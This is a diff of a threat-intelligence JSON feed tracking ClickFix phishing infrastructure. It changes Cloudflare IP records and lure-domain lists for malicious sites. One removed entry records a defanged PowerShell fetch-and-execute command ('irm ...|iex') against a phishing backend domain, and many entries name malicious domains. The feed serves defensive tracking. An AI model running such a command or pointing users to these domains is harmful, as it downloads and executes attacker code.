+   "ip": "2a06:98c1:3121::3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
@@ -238047,7 +238032,7 @@
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "2a06:98c1:3120::3",
+     "ip": "188.114.97.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -238061,14 +238046,14 @@
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "104.21.38.146",
+     "ip": "2a06:98c1:3120::3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "188.114.97.3",
+     "ip": "104.21.38.146",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -250235,14 +250220,14 @@
     "ncheck-brows.beer",
     "jscdncloude.beer",
     "cloud-browse.codes",
-    "id-verfied.boats",
-    "verifing-server.codes"
+    "id-verfied.boats"
    ],
    "lure_from": [
     "codes.caffe-img.com",
     "browse-cloud.codes",
     "codes.browse-cdn.beer",
-    "jjjducodes.beer"
+    "jjjducodes.beer",
+    "browse-login.info"
    ]
   },
   {
@@ -259902,57 +259887,6 @@
    ]
   },
   {
-   "indicator": "royalhundefrisorvejle.dk",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Phishing page",
-   "status": "online",
-   "first_seen": "2026-10-28",
-   "last_seen": "2026-11-11",
-   "last_online": "2026-11-27",
-   "offline_since": null,
-   "url": "https://royalhundefrisorvejle.dk/",
-   "brand": null,
-   "product": null,
-   "hosting": "AS netcup GmbH",
-   "dns": "Cloudflare",
-   "ip": "152.53.181.41",
-   "asn": "AS197540",
-   "org": "netcup-AS netcup GmbH, DE",
-   "country": "DE",
-   "ips": [
-    {
-     "ip": "152.53.181.41",
-     "asn": "AS197540",
-     "org": "netcup-AS netcup GmbH, DE",
-     "first_seen": "2026-10-28",
-     "last_seen": "2026-11-11"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "royalhundefrisorvejle.dk",
-     "status": "online",
-     "first_seen": "2026-10-28",
-     "last_seen": "2026-11-11"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "irm 'ncheck-brows[.]beer/[id]'|iex"
-   ],
-   "connects_to": [
-    "ncheck-brows.beer"
-   ],
-   "lure_from": [
-    "codes.browse-cdn.beer",
-    "codes.caffe-img.com"
-   ]
-  },
-  {
    "indicator": "royalkiss.store",
    "type": "domain",
    "category": "clickfix",
@@ -265154,11 +265088,18 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "172.67.194.100",
+   "ip": "2606:4700:3031::ac43:c264",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
+    {
+     "ip": "104.21.20.203",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-27"
+    },
     {
      "ip": "172.67.194.100",
      "asn": "AS13335",
@@ -265175,13 +265116,6 @@
     },
     {
      "ip": "2606:4700:3035::6815:14cb",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-26",
-     "last_seen": "2026-11-27"
-    },
-    {
-     "ip": "104.21.20.203",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -275762,18 +275696,11 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.96.3",
+   "ip": "2a06:98c1:3120::3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
-    {
-     "ip": "188.114.96.3",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-26",
-     "last_seen": "2026-11-27"
-    },
     {
      "ip": "188.114.97.3",
      "asn": "AS13335",
@@ -275786,6 +275713,13 @@
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-27",
+     "last_seen": "2026-11-27"
+    },
+    {
+     "ip": "188.114.96.3",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-26",
      "last_seen": "2026-11-27"
     },
     {
@@ -275991,7 +275925,9 @@
    "connects_to": [
     "img-codes-cloude.info"
    ],
-   "lure_from": []
+   "lure_from": [
+    "browse-login.info"
+   ]
   },
   {
    "indicator": "silviapadula.it",
@@ -282129,7 +282065,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "172.67.165.19",
+   "ip": "104.21.11.25",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
@@ -283620,11 +283556,18 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.97.3",
+   "ip": "188.114.96.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
+    {
+     "ip": "172.67.193.217",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-27",
+     "last_seen": "2026-11-27"
+    },
     {
      "ip": "188.114.96.3",
      "asn": "AS13335",
@@ -284375,7 +284318,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.96.3",
+   "ip": "188.114.97.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
@@ -300594,7 +300537,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.96.3",
+   "ip": "188.114.97.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
@@ -301960,7 +301903,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "104.21.7.159",
+   "ip": "172.67.136.241",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
@@ -302571,7 +302514,8 @@
    "lure_from": [
     "codes.browse-cdn.beer",
     "jjjducodes.beer",
-    "browse-cloud.codes"
+    "browse-cloud.codes",
+    "browse-login.info"
    ]
   },
   {
@@ -304989,7 +304933,8 @@
    "lure_from": [
     "codes.browse-cdn.beer",
     "jjjducodes.beer",
-    "browse-cloud.codes"
+    "browse-cloud.codes",
+    "browse-login.info"
    ]
   },
   {
@@ -305237,20 +305182,20 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.96.3",
+   "ip": "188.114.97.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
     {
-     "ip": "188.114.96.3",
+     "ip": "188.114.97.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "188.114.97.3",
+     "ip": "188.114.96.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -310757,7 +310702,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.96.3",
+   "ip": "188.114.96.12",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
@@ -317328,7 +317273,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "172.67.215.243",
+   "ip": "104.21.16.214",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
@@ -317341,14 +317286,14 @@
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "172.67.215.243",
+     "ip": "188.114.96.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "188.114.96.3",
+     "ip": "172.67.215.243",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -319186,14 +319131,14 @@
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "188.114.97.3",
+     "ip": "188.114.96.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "188.114.96.3",
+     "ip": "188.114.97.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -321876,14 +321821,14 @@
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "104.21.32.248",
+     "ip": "188.114.97.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "188.114.97.3",
+     "ip": "104.21.32.248",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -326427,14 +326372,14 @@
     "verifyidentrob01.cc"
    ],
    "lure_from": [
+    "tthcsslread21.cc",
+    "tlschssl22read.cc",
     "fudcomcheck.art",
     "checkogosdfg33.cc",
     "govrobczxc.cc",
     "fcdnbovres.cc",
     "webffoo001.cc",
-    "webffoo002.cc",
-    "tthcsslread21.cc",
-    "tlschssl22read.cc"
+    "webffoo002.cc"
    ]
   },
   {
@@ -326700,7 +326645,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.97.3",
+   "ip": "188.114.96.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
@@ -333495,8 +333440,8 @@
     "verifyidentrob01.cc"
    ],
    "lure_from": [
-    "ubbrobccheck20.cc",
     "fudcomcheck.art",
+    "ubbrobccheck20.cc",
     "govrobczxc.cc"
    ]
   },
@@ -340195,7 +340140,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.96.3",
+   "ip": "188.114.97.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
@@ -340911,7 +340856,8 @@
    "lure_from": [
     "codes.browse-cdn.beer",
     "jjjducodes.beer",
-    "browse-cloud.codes"
+    "browse-cloud.codes",
+    "browse-login.info"
    ]
   },
   {
@@ -343126,7 +343072,7 @@
    "role": "Redirector",
    "status": "online",
    "first_seen": "2026-11-01",
-   "last_seen": "2026-11-01",
+   "last_seen": "2026-11-27",
    "last_online": "2026-11-27",
    "offline_since": null,
    "url": "https://yorka.org/",
@@ -343144,7 +343090,7 @@
      "asn": "AS29222",
      "org": "Infomaniak-AS Infomaniak Network SA, CH",
      "first_seen": "2026-11-01",
-     "last_seen": "2026-11-01"
+     "last_seen": "2026-11-27"
     }
    ],
    "hosts": [
@@ -343152,7 +343098,7 @@
      "host": "yorka.org",
      "status": "online",
      "first_seen": "2026-11-01",
-     "last_seen": "2026-11-01"
+     "last_seen": "2026-11-27"
     }
    ],
    "actor": null,
